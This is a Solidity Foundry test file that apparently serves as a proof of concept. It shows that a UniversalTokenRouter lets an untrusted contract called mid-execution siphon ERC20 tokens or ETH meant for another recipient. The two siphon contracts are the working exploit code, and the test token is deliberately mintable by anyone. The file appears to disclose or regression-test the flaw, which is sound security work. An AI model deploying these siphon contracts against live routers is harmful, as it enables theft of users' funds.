// SPDX-License-Identifier: CC0-1.0
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {IERC20} from "openzeppelin/interfaces/IERC20.sol";
import {ERC20} from "openzeppelin/token/ERC20/ERC20.sol";

import {UniversalTokenRouter, Output, Input, Action} from "../src/UniversalTokenRouter.sol";
import {UTRHelper} from "../src/UTRHelper.sol";

library Events {
    event ERC20Siphoned(uint256 amount);
    event EthSiphoned(uint256 amount);
}

contract ExampleToken is ERC20 {
    constructor() ERC20("ExampleToken", "EX") {}

    /// Example — anyone can mint without restriction
    function mint(address account, uint256 amount) public {
        _mint(account, amount);
    }
}

contract UTRTest is Test {
    address bob = makeAddr("bob");
    address alice = makeAddr("alice");

    ExampleToken token;
    UniversalTokenRouter utr;

    function setUp() public {
        token = new ExampleToken();
        utr = new UniversalTokenRouter();
        vm.prank(bob);
        token.approve(address(utr), type(uint256).max);
        token.mint(bob, 5e18);
    }

    /**
     * In this example we try to send 1.0 ExampleToken from Bob to Alice via
     * the router, but an untrusted contract called in the middle is able to
     * extract the funds from the router.
     */
    function test_erc20CanBeExtractedFromUTRWithoutPermission() public {
        UTR_ERC20Siphon siphon = new UTR_ERC20Siphon(utr, token);

        Output[] memory emptyOutputs = new Output[](0);
        Action[] memory actions = UTRHelper.actions(
            Action({
                inputs: UTRHelper.inputs(
                    Input({
                        mode: UTRHelper.TRANSFER_FROM_SENDER,
                        recipient: address(utr),
                        eip: 20,
                        token: address(token),
                        id: 0,
                        amountInMax: 1e18,
                        amountSource: UTRHelper.AMOUNT_EXACT
                    })
                ),
                flags: 0,
                // Call siphon.siphon() directly, but this could happen
                // indirectly anywhere down the call stack.
                code: address(siphon),
                data: abi.encodeWithSelector(UTR_ERC20Siphon.siphon.selector)
            }),
            Action({
                inputs: UTRHelper.inputs(
                    Input({
                        mode: UTRHelper.TRANSFER_FROM_ROUTER,
                        recipient: alice,
                        eip: 20,
                        token: address(token),
                        id: 0,
                        amountInMax: 1e18,
                        amountSource: UTRHelper.AMOUNT_ALL
                    })
                ),
                flags: 0,
                code: address(0),
                data: ""
            })
        );

        vm.expectEmit(address(siphon));
        emit Events.ERC20Siphoned(1e18);
        vm.prank(bob);
        utr.exec(emptyOutputs, actions);

        assertEq(token.balanceOf(bob), 4e18);
        assertEq(token.balanceOf(address(siphon)), 1e18);
        assertEq(token.balanceOf(alice), 0);
    }

    /**
     * In this example we try to send 1.0 Eth from Bob to Alice via
     * the router, but an untrusted contract called in the middle is able to
     * extract the funds from the router.
     */
    function test_ethCanBeExtractedFromUTRWithoutPermission() public {
        UTR_EthSiphon siphon = new UTR_EthSiphon(utr);
        // Give bob some Eth
        vm.deal(bob, 5e18);

        Output[] memory emptyOutputs = new Output[](0);
        Action[] memory actions = UTRHelper.actions(
            Action({
                inputs: UTRHelper.inputs(
                    Input({
                        mode: UTRHelper.TRANSFER_CALL_VALUE,
                        recipient: address(utr),
                        eip: UTRHelper.EIP_ETH,
                        token: address(0),
                        id: 0,
                        amountInMax: 0,
                        amountSource: UTRHelper.AMOUNT_EXACT
                    })
                ),
                flags: 0,
                // Call siphon.siphon() directly, but this could happen anywhere
                // down the call stack.
                code: address(siphon),
                data: abi.encodeWithSelector(UTR_EthSiphon.siphon.selector)
            }),
            Action({
                inputs: UTRHelper.inputs(
                    Input({
                        mode: UTRHelper.TRANSFER_FROM_ROUTER,
                        recipient: alice,
                        eip: UTRHelper.EIP_ETH,
                        token: address(0),
                        id: 0,
                        amountInMax: 1e18,
                        amountSource: UTRHelper.AMOUNT_ALL
                    })
                ),
                flags: 0,
                code: address(0),
                data: ""
            })
        );

        vm.expectEmit(address(siphon));
        emit Events.EthSiphoned(1e18);
        vm.prank(bob);
        utr.exec{value: 1e18}(emptyOutputs, actions);

        assertEq(bob.balance, 4e18);
        assertEq(address(siphon).balance, 1e18);
        assertEq(alice.balance, 0);
    }
}

contract UTR_ERC20Siphon {
    UniversalTokenRouter utr;
    ExampleToken token;

    constructor(UniversalTokenRouter _utr, ExampleToken _token) {
        utr = _utr;
        token = _token;
    }

    function siphon() public {
        uint256 balanceBefore = token.balanceOf(address(this));
        Output[] memory outputs = UTRHelper.outputs();
        Action[] memory actions = UTRHelper.actions(
            Action({
                inputs: UTRHelper.inputs(
                    Input({
                        mode: UTRHelper.ALLOWANCE_BRIDGE,
                        recipient: address(this),
                        eip: 20,
                        token: address(token),
                        id: 0,
                        amountInMax: 0,
                        amountSource: UTRHelper.AMOUNT_EXACT
                    })
                ),
                flags: 0,
                code: address(0),
                data: ""
            })
        );
        utr.exec(outputs, actions);
        uint256 balanceAfter = token.balanceOf(address(this));
        assert(balanceAfter >= balanceBefore);
        emit Events.ERC20Siphoned(balanceAfter - balanceBefore);
    }
}

contract UTR_EthSiphon {
    UniversalTokenRouter utr;

    constructor(UniversalTokenRouter _utr) {
        utr = _utr;
    }

    receive() external payable {}

    function siphon() public {
        uint256 balanceBefore = address(this).balance;
        Output[] memory outputs = UTRHelper.outputs();
        Action[] memory actions = UTRHelper.actions(
            Action({
                inputs: UTRHelper.inputs(
                    Input({
                        mode: UTRHelper.TRANSFER_CALL_VALUE,
                        recipient: address(this),
                        eip: UTRHelper.EIP_ETH,
                        token: address(0),
                        id: 0,
                        amountInMax: 0,
                        amountSource: UTRHelper.AMOUNT_EXACT
                    })
                ),
                flags: 0,
                code: address(0),
                data: ""
            })
        );
        utr.exec(outputs, actions);
        uint256 balanceAfter = address(this).balance;
        assert(balanceAfter >= balanceBefore);
        emit Events.EthSiphoned(balanceAfter - balanceBefore);
    }
}
